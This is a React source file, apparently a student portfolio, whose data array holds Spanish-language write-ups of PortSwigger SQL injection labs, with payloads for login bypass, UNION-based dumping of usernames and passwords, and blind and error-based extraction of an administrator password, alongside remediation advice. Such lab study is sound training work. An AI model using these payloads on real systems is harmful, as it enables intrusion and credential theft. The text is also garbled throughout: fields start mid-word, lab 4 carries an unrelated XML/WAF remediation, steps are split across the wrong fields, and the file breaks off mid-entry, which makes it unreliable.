import React, { useState } from 'react';
import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug, FaDatabase, FaShieldAlt, FaEyeSlash, FaClock, FaWifi, FaBolt, FaChevronRight } from 'react-icons/fa';
import { motion, AnimatePresence } from 'framer-motion';

const labsData = [
    {
        id: 1,
        title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
        type: "In-band",
        level: "Apprentice",
        payload: "' OR 1=1--",
        description: "Bypassing a WHERE clause to extract hidden products del backend usando un operador tautológico.",
        objective: "Extraer información usando vulnerabilidades SQL.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: ' OR 1=1--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P3_img22.png",
        ]
    },
    {
        id: 2,
        title: "SQL injection vulnerability allowing login bypass",
        type: "In-band",
        level: "Apprentice",
        payload: "administrator'--",
        description: "Forzar la autenticación y saltarse el mecanismo de comprobación de contraseña.",
        objective: "Extraer información usando vulnerabilidades SQL.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: administrator'--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P3_img22.png",
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
        ]
    },
    {
        id: 3,
        title: "SQL injection attack, querying the database type and version on Oracle",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT BANNER, NULL FROM v$version--",
        description: "Exfiltración activa de la firma del fabricante y versión exacta en bases de datos Oracle.",
        objective: "Extraer información usando vulnerabilidades SQL.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: ' UNION SELECT BANNER, NULL FROM v$version--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
        ]
    },
    {
        id: 4,
        title: "SQL injection attack, querying database type and version on MySQL and Microsoft",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT @@version, NULL#",
        description: "Recolectar huellas digitales de versión para los servidores MSSQL / MySQL.",
        objective: "Extraer información usando vulnerabilidades SQL.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "endada  ●​ Uso de Parsers XML Seguros: Configurar el procesador XML para que no  realice resoluciones automáticas de entidades externas o codificaciones que  puedan ocultar payloads maliciosos.  ●​ Consultas Parametrizadas: Al igual que en casos anteriores, la implementación  de sentencias preparadas evitaría que cualquier entrada dentro del XML sea  interpretada como comando SQL, sin importar cómo esté codificada.  ●​ Mejora del WAF: Configurar el Firewall para que realice una decodificación  recursiva de los datos antes de aplicar las reglas de filtrado, permitiendo detectar  ataques incluso cuando se utiliza ofuscación XML.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: ' UNION SELECT @@version, NULL#"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P5_img27.png",
            "parcial2/act08_images/P5_img28.png",
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
        ]
    },
    {
        id: 5,
        title: "SQL injection attack, listing the database contents on non-Oracle",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
        description: "Navegación completa a través del Information Schema estandarizado en SQL.",
        objective: "Extraer información usando vulnerabilidades SQL.",
        analysis: "Análisis técnico de la inyección SQL en base de datos.",
        impact: "Peligro Inminente. Se requiere parchear.",
        steps: [
            {
                title: "Identificación de la vulnerabilidad",
                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                code: "GET / HTTP/1.1"
            },
            {
                title: "Explotación del vector de ataque",
                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                code: "PAYLOAD: ' UNION SELECT table_name, NULL FROM information_schema.tables--"
            },
            {
                title: "Evidencia de éxito",
                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                code: "HTTP/1.1 200 OK"
            },
        ],
        images: [
            "parcial2/act08_images/P6_img31.png",
            "parcial2/act08_images/P6_img32.png",
            "parcial2/act08_images/P7_img35.png",
            "parcial2/act08_images/P7_img36.png",
        ]
    },
    {
        id: 6,
        title: "SQL injection attack, listing the database contents on Oracle",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT table_name, NULL FROM all_tables--",
        description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.",
        objective: "Extraer el nombre de la tabla de usuarios, identificar los  nombres de las columnas, extraer la contraseña del usuario administrator en una base  de datos Oracle y acceder a su cuenta para resolver el reto.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "de la Vulnerabilidad: La vulnerabilidad se encuentra en el filtro  de categorías. Al ser una base de datos Oracle, la explotación tiene dos reglas críticas:   ue e   SELECT obligatorio: Toda consulta SELECT debe tener una cláusula FROM. Se  utiliza la tabla dual del sistema (FROM DUAL) para pruebas iniciales.  Diccionario de Datos: Los metadatos de las tablas y columnas no están en  information_schema, sino en las tablas del sistema all_tables y all_tab_columns.  Además, Oracle suele manejar los nombres de objetos en MAYÚSCULAS.",
        impact: "endada  ●​ Sentencias Preparadas: Utilizar consultas parametrizadas para asegurar que el  input del usuario sea tratado siempre como dato y no como parte del comando  ejecutable.  ●​ Restricción de Metadatos: Configurar los permisos de la base de datos para  que el usuario web no tenga privilegios de lectura sobre tablas de sistema como  all_tables o all_tab_columns.  ●​ Validación Estricta: Implementar una arquitectura de \"deny-by-default\" para  parámetros de entrada, permitiendo únicamente valores alfanuméricos simples.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Intercepción: Se capturó la petición GET /filter?category=... en el Proxy Interceptor de Burp Suite. Confirmación de Columnas: Se determinó que la consulta devuelve 2 columnas inyectando ' ORDER BY 2--. Enumeración de Tablas: Se consultó la tabla all_tables para encontrar la tabla de usuarios generada aleatoriamente. Resultado: Se identificó la tabla USERS_GGYPYC. Enumeración de Columnas: Se consultó all_tab_columns filtrando por el nombre de la tabla encontrada. Resultado: Se identificaron las columnas USERNAME_OCIROF y PASSWORD_CAPDCE.",
                code: ""
            },
            {
                title: "Paso 12",
                text: "Se inyecta el siguiente código:",
                code: "●​ Extracción de Credenciales: Se realizó el UNION SELECT final para obtener la"
            },
            {
                title: "Paso 13",
                text: "contraseña de la cuenta administrator. Acceso: Inicio de sesión exitoso en el navegador Firefox (reemplazando la contraseña por la extraída). Final  ●​ ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM  USERS_GGYPYC--  ●​ ': Cierra la comilla simple del parámetro category.  ●​ UNION SELECT: Combina nuestra consulta personalizada con los resultados  originales.  ●​ USERNAME_OCIROF, PASSWORD_CAPDCE: Son los nombres específicos de  las columnas que contienen la información sensible en Oracle.  ●​ FROM USERS_GGYPYC: La tabla de usuarios específica identificada durante la  fase de enumeración.  ●​ -- : Operador de comentario para anular el resto de la consulta SQL original.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P7_img35.png",
            "parcial2/act08_images/P7_img36.png",
            "parcial2/act08_images/P7_img37.png",
            "parcial2/act08_images/P9_img42.png",
        ]
    },
    {
        id: 7,
        title: "SQL injection UNION attack, determining the number of columns",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' ORDER BY 3--",
        description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.",
        objective: "Identificar cuántas columnas está recuperando la  consulta original en la categoría de filtros para poder realizar un ataque UNION  exitoso.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "Para que una sentencia UNION funcione, ambas  consultas deben devolver el mismo número de columnas. Si el atacante intenta  unir una consulta con un número distinto de columnas, la base de datos  devolverá un error. Se utilizan sentencias ORDER BY o UNION SELECT NULL  de forma incremental para hallar el límite.  ●​",
        impact: "endada: Uso de consultas parametrizadas para evitar que el valor  del filtro de categoría sea interpretado como código SQL.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder a la categoría de productos (ej. \"Gifts\"). Interceptar la petición con Burp Suite. Mandar el codigo de la pagina obtenido en el PROXY a REPEATER .",
                code: ""
            },
            {
                title: "Paso 5",
                text: "Se inyecta el siguiente código:",
                code: "○​ Inyectar en el parámetro category el payload ' UNION SELECT NULL,"
            },
            {
                title: "Paso 6",
                text: "NULL--.. Cuando la página devuelva un error o falte contenido, el número de columnas será el valor anterior al error.",
                code: ""
            },
            {
                title: "Paso 9",
                text: "Se inyecta el siguiente código:",
                code: "○​ Payload actualizado: ' UNION SELECT NULL, NULL, NULL--."
            },
            {
                title: "Paso 10",
                text: " El payload ' UNION SELECT NULL, NULL, NULL--  intenta fusionar la consulta original con una fila de tres valores nulos. Si la  consulta original devuelve exactamente 3 columnas, la operación es válida y la  página carga. Los guiones -- comentan el resto de la consulta original para evitar  errores sintácticos.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P10_img46.png",
            "parcial2/act08_images/P10_img47.png",
            "parcial2/act08_images/P9_img42.png",
            "parcial2/act08_images/P9_img43.png",
        ]
    },
    {
        id: 8,
        title: "SQL injection UNION attack, finding a column containing text",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT NULL, 'a', NULL--",
        description: "Identificando la composición atómica (String/Integer) de las columnas.",
        objective: "Una vez determinado el número de columnas,  identificar cuál de ellas es capaz de procesar y mostrar datos de tipo cadena  (string).  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "No todas las columnas de una base de datos aceptan  texto (algunas son solo numéricas o fechas). El atacante debe probar inyectando  una cadena de caracteres constante en cada posición de la sentencia UNION  hasta que la aplicación la renderice en la pantalla.  ●​",
        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder a la categoría de productos (ej. \"Corporate gifts\"). Al igual que con el anterior laboratorio: Interceptar la petición con Burp Suite y mandar el codigo de la pagina obtenido en el PROXY a REPEATER Comprobar el número de columnas hallado como en el lab anterior (igualmente, 3 columnas en este caso). Probar payloads moviendo una cadena única (ej. 'abc') entre las posiciones:",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P10_img46.png",
            "parcial2/act08_images/P10_img47.png",
            "parcial2/act08_images/P9_img42.png",
            "parcial2/act08_images/P9_img43.png",
        ]
    },
    {
        id: 9,
        title: "SQL injection UNION attack, retrieving data from other tables",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT username, password FROM users--",
        description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.",
        objective: "Exfiltrar los nombres de usuario y contraseñas de la  tabla users y utilizarlos para iniciar sesión como administrador.  ●​. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "Este ataque permite acceder a tablas que no tienen  relación directa con la funcionalidad original (catálogo de productos). El atacante  \"roba\" el flujo de datos de la página para redirigir información de la tabla de  credenciales hacia la interfaz pública.  ●​",
        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El  usuario de la base de datos que utiliza la aplicación web no debería tener  permisos de lectura sobre la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder a una de las categorías disponibles en la pagina (ej. \"Tech gifts\"). Utilizar Burp Suite para interceptar y modificar la solicitud que establece el filtro de categoría de producto. Determinar que hay 2 columnas disponibles y que ambas aceptan texto.",
                code: ""
            },
            {
                title: "Paso 5",
                text: "Se inyecta el siguiente código:",
                code: "○​ Inyectar el payload para extraer datos: ' UNION SELECT username,"
            },
            {
                title: "Paso 6",
                text: "password FROM users--. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador”. Ir a la sección \"My account\" y loguearse con la contraseña obtenida.  La parte SELECT username, password FROM users  solicita a la base de datos que busque en la tabla users (una tabla común en  estos sistemas) y traiga los valores de las columnas de identificación. La unión  hace que estos datos aparezcan donde normalmente estarían los nombres de  los productos.   ●​",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P10_img46.png",
            "parcial2/act08_images/P10_img47.png",
            "parcial2/act08_images/P12_img53.png",
            "parcial2/act08_images/P12_img54.png",
        ]
    },
    {
        id: 10,
        title: "SQL injection UNION attack, retrieving multiple values in a single column",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT NULL, username || '~' || password FROM users--",
        description: "Emulando y concatenando outputs en DBs de columnas de string singulares.",
        objective: "Exfiltrar los nombres de usuario y contraseñas de la tabla  users y utilizarlos para iniciar sesión como administrador.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "Este ataque permite al atacante \"robar\" el flujo de datos de la  página para redirigir información de la tabla de credenciales hacia la interfaz pública, en  este caso, mostrando los usuarios y contraseñas donde normalmente se verían los  productos.",
        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El usuario de la  base de datos que utiliza la aplicación web no debería tener permisos de lectura sobre  la tabla users o tablas administrativas del sistema.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder a una de las categorías disponibles en la página (ej. \"Accesorios\" o \"Regalos\") .",
                code: ""
            },
            {
                title: "Paso 3",
                text: "Se inyecta el siguiente código:",
                code: "Determinar el número de columnas de la tabla, utilizando un ‘ UNION SELECT NULL,"
            },
            {
                title: "Paso 4",
                text: "NULL- - y probando hasta que no haya error. En este caso, se confirma que hay dos columnas. Determinar el tipo de datos de cada columna. Probar con un 'string' en la primera columna y ver que da error, indicando que es numérica. Probar con 'string' en la segunda columna y ver que no da error, indicando que acepta texto. Inyectar el payload para extraer datos. Se recomienda usar la concatenación de la primera columna (username) y la segunda (password) de la tabla users . El payload",
                code: ""
            },
            {
                title: "Paso 11",
                text: "Se inyecta el siguiente código:",
                code: "sería similar a: UNION SELECT NULL, username || ':' || password FROM users--. Se"
            },
            {
                title: "Paso 12",
                text: "introduce un punto y coma como separador entre el usuario y la contraseña. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador” . Ir a la sección \"My account\" y loguearse con la contraseña obtenida. Confirmación: Inicio de sesión exitoso como administrador y el laboratorio se marca como resuelto. La parte SELECT NULL, username || ':' || password FROM  users solicita a la base de datos que busque en la tabla users y traiga los valores de las  columnas username y password, concatenados y separados por un carácter. La  cláusula UNION hace que estos datos se añadan a la consulta original y aparezcan  donde normalmente estarían los nombres de los productos, en la segunda columna que  acepta strings.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P12_img53.png",
            "parcial2/act08_images/P12_img54.png",
            "parcial2/act08_images/P13_img57.png",
            "parcial2/act08_images/P13_img58.png",
        ]
    },
    {
        id: 11,
        title: "Blind SQL injection with conditional responses",
        type: "Blind",
        level: "Practitioner",
        payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
        description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.",
        objective: "Obtener el usuario y la contraseña del administrador de la  tabla users.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "Este tipo de ataque de inyección SQL no muestra errores o  información directamente en la página. En su lugar, el atacante deduce la información a  través de la respuesta del servidor a consultas condicionales, como la aparición o  ausencia de un mensaje específico en la página (\"Welcome Back\" en este caso) o  diferencias en el tiempo de respuesta. Esto permite al atacante extraer datos carácter  por carácter.",
        impact: "endada: Validación de entradas y consultas parametrizadas: Utilizar  sentencias preparadas o consultas parametrizadas para separar el código SQL de los  datos de entrada del usuario. Esto previene que los comandos inyectados sean  ejecutados .  Sanitización estricta de entradas: Validar las entradas del usuario contra formatos  esperados y rechazar caracteres maliciosos .  Principio de mínimo privilegio: Configurar las cuentas de base de datos utilizadas  por la aplicación web con los permisos mínimos necesarios. Incluso si ocurre una  inyección, el daño estará limitado.  Manejo de errores no detallado: Evitar mostrar errores detallados de la base de datos  a los usuarios. Los mensajes genéricos impiden que los atacantes confirmen  inyecciones exitosas.  Web Application Firewalls (WAFs): Implementar WAFs con análisis de  comportamiento para detectar patrones indicativos de inyecciones SQL ciegas, como  consultas frecuentes y ligeramente variadas que desencadenan diferentes estados  HTTP o tiempos de respuesta.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder al laboratorio y observar el comportamiento de la aplicación: Navegar por las categorías (ej. \"Accessories\"). Identificar el campo vulnerable (Cookies): Utilizar Burp Suite para interceptar la solicitud y modificar el valor de la cookie",
                code: ""
            },
            {
                title: "Paso 5",
                text: "Se inyecta el siguiente código:",
                code: "TrackingId."
            },
            {
                title: "Paso 6",
                text: "Se inyecta el siguiente código:",
                code: "Insertar una comilla simple ' en el valor de TrackingId y enviar la solicitud."
            },
            {
                title: "Paso 7",
                text: "Observar que el mensaje \"Welcome Back\" desaparece, lo que indica una inyección SQL efectiva Confirmar la existencia de la tabla users:",
                code: ""
            },
            {
                title: "Paso 10",
                text: "Se inyecta el siguiente código:",
                code: "Inyectar el siguiente payload en el valor de la cookie TrackingId: ' AND (SELECT 'a'"
            },
            {
                title: "Paso 11",
                text: "FROM users WHERE 'a'='a' LIMIT 1)-- Si la tabla users existe, el mensaje \"Welcome Back\" reaparecerá . Si no, desaparecerá. Confirmar la existencia del usuario administrator: Inyectar el siguiente payload: ' AND (SELECT username FROM users WHERE",
                code: ""
            },
            {
                title: "Paso 15",
                text: "Se inyecta el siguiente código:",
                code: "username = 'administrator') = 'administrator'--"
            },
            {
                title: "Paso 16",
                text: "Si el usuario administrator existe, el mensaje \"Welcome Back\" reaparecerá.Si no, desaparecerá. Determinar la longitud de la contraseña del administrador: Inyectar payloads para probar la longitud de la contraseña. Por ejemplo, para saber si es mayor a 19 caracteres: ' AND (SELECT username FROM users WHERE username",
                code: ""
            },
            {
                title: "Paso 21",
                text: "Se inyecta el siguiente código:",
                code: "= 'administrator' AND LENGTH(password) > 19) = 'administrator'--"
            },
            {
                title: "Paso 22",
                text: "Ajustar el número hasta que el mensaje \"Welcome Back\" reaparezca, indicando la longitud correcta (la contraseña tiene 20 caracteres). El payload base para cada carácter es: ' AND (SELECT SUBSTRING(password, {posición_caracter}, 1) FROM users WHERE username = 'administrator') =",
                code: ""
            },
            {
                title: "Paso 26",
                text: "Se inyecta el siguiente código:",
                code: "'{caracter_a_probar}'--"
            },
            {
                title: "Paso 27",
                text: "Si el carácter probado en la posición actual es correcto, el mensaje \"Welcome Back\" reaparecerá. El script registrará el carácter y pasará a la siguiente posición. Se usará un script de Python que automatiza este proceso. request:  para  hacer peticiones al servidor. string: añadir los caracteres que queremos que se prueben. urllib.parse: para evitar el https del servidor. urllib3: para python 3 Funcionamiento del codigo:",
                code: ""
            },
            {
                title: "Paso 35",
                text: "Se inyecta el siguiente código:",
                code: "●​ \"TrackingId=\": Es el prefijo de la cookie vulnerable."
            },
            {
                title: "Paso 36",
                text: "Se inyecta el siguiente código:",
                code: "●​ \"o539b7p1d9s8z9o5\": Es el valor original de la cookie TrackingId."
            },
            {
                title: "Paso 37",
                text: "\"';\": Se añade para cerrar la instrucción SQL original y permitir la inyección. payload_url.format(i, char): Aquí es donde la plantilla del payload se formatea con la posición actual (i) y el carácter a probar (char). requests.get(url, ...): Envía una petición GET a la url del laboratorio.",
                code: ""
            },
            {
                title: "Paso 41",
                text: "Se inyecta el siguiente código:",
                code: "●​ cookies={'TrackingId': cookie}: Establece el valor de la cookie TrackingId con el"
            },
            {
                title: "Paso 42",
                text: "payload SQL construido. verify=False: Desactiva la verificación del certificado SSL/TLS del servidor, lo que a menudo es necesario en entornos de prueba o si hay problemas con los certificados. if \"Welcome back\" in r.text:: El script verifica si el mensaje \"Welcome back\"",
                code: ""
            },
            {
                title: "Paso 47",
                text: "Se inyecta el siguiente código:",
                code: "aparece en el texto de la respuesta HTTP. Si el mensaje está presente, significa"
            },
            {
                title: "Paso 48",
                text: "que la condición SQL inyectada fue verdadera, y por lo tanto, el carácter adivinado es correcto para esa posición. contraseña += char: Si el carácter es correcto, se añade a la variable contraseña. break: Una vez que se encuentra el carácter correcto para la posición actual, el bucle interior se rompe, y el script pasa a la siguiente posición de la contraseña. Damos permisos al archivo y lo ejecutamos para obtener la contraseña , es importante decir que al reiniciar el laboratorio la cookie cambia por lo tanto la contraseña tambien lo hará. Iniciar sesión con las credenciales obtenidas: Una vez que el script haya extraído la contraseña completa, ir a la sección \"My account\" del laboratorio. Ingresar administrator como nombre de usuario y la contraseña obtenida. Iniciar sesión para resolver el laboratorio. Los payloads utilizan operadores lógicos (AND) y funciones  SQL (SELECT, LENGTH, SUBSTRING) dentro de la sección de la cookie TrackingId.  Esto permite al atacante construir consultas que, aunque no devuelven datos  directamente, alteran el comportamiento de la página (el mensaje \"Welcome Back\") de  una manera que revela información sobre la base de datos de forma ciega.",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P12_img53.png",
            "parcial2/act08_images/P12_img54.png",
            "parcial2/act08_images/P13_img57.png",
            "parcial2/act08_images/P13_img58.png",
        ]
    },
    {
        id: 12,
        title: "Blind SQL injection with conditional errors",
        type: "Blind",
        level: "Practitioner",
        payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.",
        objective: "Obtener la contraseña del usuario administrador y usarla  para iniciar sesión.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "Este tipo de ataque de SQL Injection no muestra los resultados  directamente en la pantalla. En su lugar, se infiere la información observando si la  consulta inyectada provoca un error en la base de datos o si devuelve un código de  estado 200. Al generar errores controlados basándose en condiciones verdaderas o  falsas, se puede determinar la existencia de tablas, usuarios o caracteres específicos  de la contraseña.",
        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Acceder al laboratorio y comprender la vulnerabilidad: Ingresar al laboratorio y observar que las categorías no son vulnerables. Identificar que la inyección se realiza en el campo tracking ID de las cookie como indica en el lab. Modificar el tracking ID y verificar que una comilla simple (') genera un error , confirmando la vulnerabilidad. Preparar Burp Suite para la inyección: Interceptar la petición y enviarla al Repeater. Determinar el tipo de base de datos: Inyectar un payload de prueba como ' || (SELECT '') || ' y observar que genera un error",
                code: ""
            },
        ],
        images: [
            "parcial2/act08_images/P13_img57.png",
            "parcial2/act08_images/P13_img58.png",
            "parcial2/act08_images/P15_img64.png",
            "parcial2/act08_images/P15_img65.png",
        ]
    },
    {
        id: 13,
        title: "Visible error-based SQL injection",
        type: "Error-based",
        level: "Practitioner",
        payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--",
        description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.",
        objective: "●​ Extraer la contraseña del usuario “administrator” de la tabla users.  ●​ Realiza un inicio de sesión exitoso con dichas credenciales para  comprometer la cuenta.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
        analysis: "El laboratorio presenta una vulnerabilidad en el manejo de  cookies de rastreo (tracking cookies). El flujo de explotación se resume en los  siguientes puntos:  ●​ Punto de Inyección: La aplicación toma el valor de la cookie enviada por  el navegador y lo concatena directamente en una consulta SQL interna.  ●​ Mecanismo de Error: Aunque la aplicación no muestra los resultados  directos de la consulta (los registros de la tabla), está configurada para  mostrar errores detallados de la base de datos cuando una consulta falla.  ●​ Estrategia de Explotación: Se debe inyectar una sintaxis SQL maliciosa  que fuerce un error de conversión o de tipo de dato. Por ejemplo, al  intentar convertir una cadena de texto (la contraseña que queremos  robar) en un número entero, la base de datos generará un error similar a:​ ERROR: invalid input syntax for type integer: \"S3cur3P4ssw0rd\"  ●​ Fuga de Datos (Data Leaking): Al leer ese mensaje de error en la  pantalla, el atacante obtiene el dato que la base de datos intentó procesar  infructuosamente, logrando así \"sacar\" información de tablas a las que no  debería tener acceso.",
        impact: "endada:  En este escenario, el atacante aprovecha los mensajes técnicos para obtener  información. La estrategia debe ser doble:  ●​ Consultas Preparadas (Sentencias Parametrizadas): Esta es la defensa  principal. En lugar de concatenar la cookie directamente en el string SQL, se usa  un marcador de posición (?). El motor de la base de datos trata el valor de la  cookie como un simple dato y no como parte del código ejecutable.  ●​ Desactivar Mensajes de Error Detallados: En entornos de producción, la  aplicación nunca debe mostrar errores internos del motor de base de datos  (como tipos de datos o nombres de columnas). Se debe configurar una página  de error genérica para el usuario, mientras que el error real se guarda en un log  privado para los desarrolladores.  ●​ Validación de Entrada: Si la cookie de rastreo debe tener un formato específico  (por ejemplo, solo letras y números), se debe validar mediante una expresión  regular antes de procesarla.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
        steps: [
            {
                title: "Paso 1",
                text: "Accederemos a la instancia que nos genere PortSwigger desde el navegador integrado de BurpSuite (sin tener activado el interceptor). Exploraremos la página para cargar distintas instancias. Una vez exploradas, irémos a",
                code: ""
            },
            {
                title: "Paso 4",
                text: "Se inyecta el siguiente código:",
                code: "la pestaña “Proxy”, a la sección “HTTP History”, y buscarémos cualquier petición GET ​"
            },
            {
                title: "Paso 5",
                text: "Se inyecta el siguiente código:",
                code: "que contenga la Cookie “TrackingId”, y la envíamos al repetidor."
            },
            {
                title: "Paso 6",
                text: "Regresarémos a BurpSuite y enviaremos esa petición al repetidor. Al final del valor de",
                code: ""
            },
            {
                title: "Paso 7",
                text: "Se inyecta el siguiente código:",
                code: "la Cookie de TrackingId, añadirémos una comilla simple, y enviaremos la solicitud por"
            },
            {
                title: "Paso 8",
                text: "medio del repetidor. Al enviarla y explorar en el contenido HTML, podemos observar que nos muestra un error de consulta SQL.  Ahora sabemos que el contenido de la cookie sirve para realizar una consulta SQL. Añadirémos los caracteres de comentario (“--” en SQL) Si no nos muestra ningún error significa que nuestra consulta será válida de manera sintática. Después de la comilla simple, añadiremos la consulta “AND CAST((SELECT 1)) AS int)--”. De esta manera adaptaremos la consulta para incluir una subconsulta SELECT genérica y convertir el valor devuelto a un tipo de datos int. Como podremos ver, al enviar la solicitud nos arroja un error diciendo que la condición “AND” debe ser una exrpesión booleana. Modificaremos la condición, añadiendo un",
                code: ""
            },
            {
                title: "Paso 19",
                text: "Se inyecta el siguiente código:",
